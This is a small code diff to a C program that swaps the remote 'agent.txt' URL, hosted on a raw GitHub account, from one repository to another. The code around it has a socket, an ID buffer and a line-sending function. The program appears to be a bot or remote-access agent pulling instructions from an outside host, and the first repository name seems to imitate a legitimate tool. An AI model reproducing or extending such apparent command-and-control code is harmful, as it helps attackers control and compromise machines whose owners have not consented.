@@ -14,7 +14,7 @@
 
 static int sock = -1;
 static char idbuf[64];
-static const char *AGENT_URL = "https://raw.githubusercontent.com/cloudflared9-hub/agent/main/agent.txt";
+static const char *AGENT_URL = "https://raw.githubusercontent.com/risalmuhammd66-byte/agent/main/agent.txt";
 
 static void sendline(const char *s)
 {
